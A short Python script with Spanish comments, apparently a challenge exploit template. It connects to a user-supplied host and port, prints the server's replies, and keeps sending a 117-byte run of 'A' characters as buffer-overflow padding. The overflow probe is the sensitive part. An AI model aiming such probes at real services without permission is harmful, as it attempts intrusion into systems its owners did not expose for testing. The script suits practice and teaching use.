import socket
import threading
import sys

def exploit(n):
    """Exploit de ejemplo, en particular para este problema todo esto es al pedo pero es mas comodo a la larga hacerlo asi"""
    return n*'A'

def receiver(sock):
    """Función encargada exclusivamente de escuchar y mostrar los datos entrantes."""
    while True:
        try:
            # Recibe hasta 4096 bytes
            data = sock.recv(4096)
            if not data:
                print("\n[+] Conexión cerrada por el servidor.")
                break
            # Decodifica los bytes a texto (ignorando errores de caracteres extraños)
            print(data.decode('utf-8', errors='ignore'), end='')
        except Exception as e:
            print(f"\n[-] Error al recibir datos: {e}")
            break
    # Forzar la salida del script si el servidor se desconecta
    sys.exit()

def sender(sock):
    """Función encargada exclusivamente de capturar tu input y enviarlo."""
    while True:
        try:
            # Lee la entrada del usuario
            # message = input()
            message=exploit(117)# Aca el mensaje lo voy a elegir con mi funcion exploit
            # Envía el mensaje codificado en bytes (añadiendo salto de línea)
            sock.sendall((message + '\n').encode('utf-8'))
        except (KeyboardInterrupt, EOFError):
            print("\n[-] Saliendo...")
            break
        except Exception as e:
            print(f"\n[-] Error al enviar datos: {e}")
            break
    sys.exit()

def conectar(host, port):
    """Establece la conexión e inicia los hilos de envío y recepción."""
    # Crear el socket TCP
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        print(f"[+] Conectando a {host}:{port}...")
        sock.connect((host, port))
        print("[+] ¡Conectado con éxito! Puedes empezar a escribir.")
    except Exception as e:
        print(f"[-] No se pudo conectar a {host}:{port}. Error: {e}")
        return

    # Crear hilos para que sender y receiver corran en paralelo
    thread_receiver = threading.Thread(target=receiver, args=(sock,), daemon=True)
    thread_sender = threading.Thread(target=sender, args=(sock,), daemon=True)

    # Iniciar hilos
    thread_receiver.start()
    thread_sender.start()

    # Mantener el hilo principal vivo mientras los subhilos trabajen
    thread_receiver.join()
    thread_sender.join()

    # Cerrar el socket al terminar
    sock.close()

if __name__ == "__main__":
    # Configura aquí la IP/Link y el Puerto por defecto
    # También puedes modificar el script para que los reciba por argumentos (sys.argv)
    TARGET_HOST = input()  #EJ 127.0.0.1 Cambia por la IP o dominio destino
    TARGET_PORT = int(input())  #EJ 8080  Cambia por el puerto destino

    conectar(TARGET_HOST, TARGET_PORT)

